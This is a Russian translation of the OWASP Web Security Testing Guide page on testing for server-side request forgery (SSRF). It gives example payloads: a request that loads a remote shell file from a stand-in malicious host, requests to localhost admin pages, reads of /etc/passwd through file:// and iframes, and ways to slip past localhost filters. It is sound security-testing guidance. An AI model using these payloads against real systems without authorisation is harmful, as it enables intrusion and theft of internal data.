---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование подделки запроса на стороне сервера (SSRF)

|ID          |
|------------|
|WSTG-INPV-19|

## Обзор

Web-приложения часто взаимодействуют с внутренними или внешними ресурсами. Хотя вы можете ожидать, что обрабатывать отправляемые вами данные будет только предназначенный для этого ресурс, некорректно обработанные данные могут создать ситуацию, в которой возможны атаки путём инъекции. Одним из видов инъекций является подделка запросов на стороне сервера (SSRF). Успешная атака SSRF может предоставить злоумышленнику доступ к привилегированным действиям, внутренним службам или файлам в приложении или организации. В некоторых случаях это даже может привести к удалённому выполнению кода (RCE).

## Задачи тестирования

- Найти точки для инъекции SSRF.
- Протестировать, пригодны ли эти точки для эксплуатации.
- Оценить воздействие уязвимости.

## Как тестировать

При тестировании SSRF вы пытаетесь заставить целевой сервер неявно загружать или сохранять содержимое, которое может быть вредоносным. Самый распространённый тест — локальное и удалённое включение файлов. Есть ещё один аспект SSRF: доверительные отношения, которые часто возникают, когда сервер приложений может взаимодействовать с другими бэкенд-серверами, недоступными для пользователей напрямую. Эти серверы часто имеют немаршрутизируемые частные IP-адреса или ограничены определёнными хостами. Поскольку они защищены топологией сети, им часто не хватает более сложных элементов управления. Эти внутренние системы часто содержат чувствительные данные или функции.

Рассмотрим следующий запрос:

``` http
GET https://example.com/page?page=about.php
```

Вы можете протестировать этот запрос с полезными нагрузками, представленными ниже.

### Загрузить содержимое файла

```http
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

### Обратиться к странице с ограниченным доступом

```http
GET https://example.com/page?page=http://localhost/admin
```

Или:

```http
GET https://example.com/page?page=http://127.0.0.1/admin
```

Используйте интерфейс обратной связи (англ.: loopback) для доступа к контенту, доступ к которому ограничен только хостом. Этот механизм подразумевает, что если у вас есть доступ к хосту, у вас также есть привилегии для прямого доступа к странице `admin`.

Такого рода доверительные отношения, при которых запросы, исходящие с локального компьютера, обрабатываются иначе, чем все остальные, часто делают SSRF критической уязвимостью.

### Извлечь локальный файл

```http
GET https://example.com/page?page=file:///etc/passwd
```

### Используемые HTTP-методы

Все приведенные выше полезные данные могут применяться к любому типу HTTP-запроса, а также могут быть вставлены в значения заголовков и cookie.

Одно важное замечание относительно SSRF с POST-запросами заключается в том, что SSRF также может проявляться вслепую, потому что приложение может сразу ничего и не выдавать. Вместо этого введённые данные могут использоваться в других функциях, таких как отчёты в формате PDF, обработка счетов-фактур или заказов и т.д., которые могут быть видны сотрудникам или персоналу, но не обязательно конечному пользователю или тестировщику.

Узнать больше о слепом SSRF можно [здесь](https://portswigger.net/web-security/ssrf/blind), или в [разделе ссылок](#ссылки).

### Генераторы PDF

В некоторых случаях сервер может конвертировать загруженные файлы в формат PDF. Попробуйте вставить элементы `<iframe>`, `<img>`, `<base>` или `<script>` или функцию CSS `url()`, указывающие на внутренние службы.

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

### Распространённые пути обхода фильтра

Некоторые приложения блокируют ссылки на `localhost` и `127.0.0.1`. Это можно обойти с помощью:

- Использование альтернативного представления IP-адреса, которое эквивалентно `127.0.0.1`:
    - Десятичное: `2130706433`
    - Восьмеричное: `017700000001`
    - Сокращённая запись IP: `127.1`
- Обфускация строк
- Регистрация собственного домена, который разрешается в `127.0.0.1`

Иногда приложение допускает ввод, соответствующий только определённому выражению, например домену. Это можно обойти, если неправильно реализован парсер схемы URL, что может привести к следующим [семантическим атакам](https://datatracker.ietf.org/doc/html/rfc3986#section-7.6):

- использованию символа `@` для разделения информации о пользователе и хосте: `https://expected-domain@attacker-domain`;
- URL-фрагменты с помощью символа `#`: `https://attacker-domain#expected-domain`;
- URL-кодировка;
- фаззинг;
- сочетания из всего вышеперечисленного.

Дополнительные полезные нагрузки и методы обхода см. в разделе [Ссылки](#ссылки).

## Меры защиты

Известно, что SSRF — одна из самых сложных атак, которую невозможно отразить без использования списков разрешений (ACL), требующих указания конкретных IP- и URL-адресов. Подробнее о защите от SSRF см. в [Памятке по предотвращению подделки запросов на стороне сервера](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## Ссылки

- [swisskyrepo: SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
- [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
- [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Portswigger: SSRF](https://portswigger.net/web-security/ssrf)
- [Portswigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
- [Bugcrowd: SSRF](https://www.bugcrowd.com/glossary/server-side-request-forgery-ssrf/)
- [Hackerone Blog: SSRF](https://www.hackerone.com/application-security/how-server-side-request-forgery-ssrf)
- [Hacker101: SSRF](https://www.hacker101.com/sessions/ssrf.html)
- [Общий синтаксис URI](https://datatracker.ietf.org/doc/html/rfc3986)
